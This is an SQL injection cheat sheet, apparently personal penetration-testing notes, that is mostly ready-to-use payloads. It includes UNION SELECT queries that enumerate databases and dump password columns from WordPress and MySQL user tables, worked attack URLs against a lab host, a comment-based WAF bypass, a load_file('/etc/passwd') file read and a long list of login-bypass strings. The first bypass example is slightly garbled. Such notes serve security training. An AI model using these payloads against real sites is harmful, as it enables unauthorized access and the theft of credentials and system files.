# SQL Injection
 **Resources:**
- https://charcharbinks.com/post/introductiontodatabasesforhackers-zerotosqli/
- https://github.com/rewardone/OSCPRepo/blob/master/CheetSheets/Database/SQLiWithWFUZZ.txt
## Basic Login Bypass
```sql
Example -> SELECT * FROM users WHERE user='admin' AND password='password123!'
```
Attack -> SELECT * FROM users WHERE user='1=1 -- -' ~~AND password='password123!'~~

---

## Dump querys
```sql
SELECT title, review FROM games WHERE title LIKE = '%'
```
- Attack ORDER BY:
 ' ORDER BY 1-- -
 ' ORDER BY 2-- -
 ...
 ' ORDER BY 100-- - (try querys until have error to enumerate cols)

When we have enumerated all cols we can try to inject malicious querys

- Attack UNION SELECT:
 ' UNION SELECT null,'test',null-- - (try to inject strings in the cols)
 ' UNION SELECT 1,2,3-- -
 ' UNION SELECT 1,user(),@@version-- -
 ' UNION SELECT null,null,schema_name FROM information_schema.SCHEMATA-- -
 ' UNION SELECT null,null,table_name FROM information_schema.TABLES WHERE table_schema='db'-- -
 ' UNION SELECT null,TABLE_NAME,column_name FROM information_schema.COLUMNS WHERE table_schema='db'-- -
 ' UNION SELECT 1, username, pwd FROM users-- -
				
| Query | Result|
|---|---|
| @@hostname| enumerate the hostname |
| @@version | enumerate version of the DBs |
| user() | enumerate user |
| database() | enumerate db |
| schema_name FROM information_schema.SCHEMATA | enumerate all dbs |
|table_name FROM information_schema.TABLES WHERE table_schema='db' | enumerate tables from a db|
| 'UNION SELECT null,TABLE_NAME,column_name FROM information_schema.COLUMNS WHERE table_schema='db'-- - | enumerate cols in the tables of the db | 
 | ' UNION SELECT 1, username, pwd FROM users-- - | dump password from users | 

---

## Misc SQL
**Try querys like**
```sql
1 = 1
or 1 = 1
1' or '1' = '1'; /# /-- -
```
##### End querys with comments like: 	**';'**   ,   **'#'**   ,   **'-- -'**   ,   **'--'**		,   etc.

| DBs | Command | Description |
| -- | -- | -- |
| MySQL | mysql -u user -p localhost **-e** 'select * from users;' | execute command |

| Type | Query |
| --- | --- |
| Fields | Select * |
| Rows | Where * = \*; |

```sql
select * from users;								# Select ALL.
select password from users where name = admin;		# Select password from users admin.
select * from orders where item_price = 924;		#Show all where the item price is 924$
```

#### Login page?
* Try sqlinjection

| Username: | admin' or 1=1-- - | admin |
|--|--|-- |
| Password: | test | ' or 1=1-- - | 


### Examples SQLi
#### Example1
```sql
' UNION SELECT null,null,schema_name FROM information_schema.SCHEMATA-- -


' UNION SELECT null,null,table_name FROM information_schema.TABLES WHERE table_schema='wordpress'-- -


' UNION SELECT null,TABLE_NAME,column_name FROM information_schema.COLUMNS WHERE table_schema='wordpress'-- -

wp_users
	-> user_pass
	-> user_login
	-> display_name

'UNION SELECT user_pass,user_login,display_name FROM wordpress.wp_users-- -
```
#### Example2
```sql
FIRST TRY WITH ORDER BY...
-> http://supersecurehotel.htb/room.php?cod=1337 UNION SELECT 1,2,3,4,5,6,7;-- -
-> http://supersecurehotel.htb/room.php?cod=1337 UNION SELECT 1,@@version,@@datadir,user(),database(),6,7;-- -
-> http://supersecurehotel.htb/room.php?cod=1337 UNION SELECT null,group_concat(schema_name),null,null,null,null,null from information_schema.schemata;-- -
-> http://supersecurehotel.htb/room.php?cod=1337 UNION SELECT null,group_concat(table_name),null,null,null,null,null from information_schema.tables WHERE table\_schema='hotel';-- -
-> http://supersecurehotel.htb/room.php?cod=1337 UNION SELECT null,group_concat(column_name),null,null,null,null,null from information_schema.columns WHERE table_schema='hotel' and table_name='room';-- -
-> http://supersecurehotel.htb/room.php?cod=1337 UNION SELECT null,group_concat(table_name),null,null,null,null,null from information_schema.tables WHERE table\_schema='mysql';-- -
-> http://supersecurehotel.htb/room.php?cod=1337 UNION SELECT null,group_concat(column_name),null,null,null,null,null from information_schema.columns WHERE table_schema='mysql' and table_name='user';-- -
-> http://supersecurehotel.htb/room.php?cod=1337 UNION SELECT null,group_concat(User,"->",Password),null,null,null,null,null from mysql.user;-- -
```


### Bypass WAF
Bypassing WAF example:
* `http://supersecurehotel.htb/room.php?cod=1/**/union/**/select/**/1,2,3,4,5,6,7--%20-`
* `http://supersecurehotel.htb/room.php?cod=12 UNION SELECT null,user(),null,null,null,null,null`

### SQLI to LFI
load_file() parameter i.e: `http://supersecurehotel.htb/room.php?cod=12 UNION SELECT null,null,load_file('/etc/passwd'),null,null,null,null`

### SQLI to RCE (ToDo) #todo



## Sqli Classic Auth Bypass 
```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
'-- -
'-- -#
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```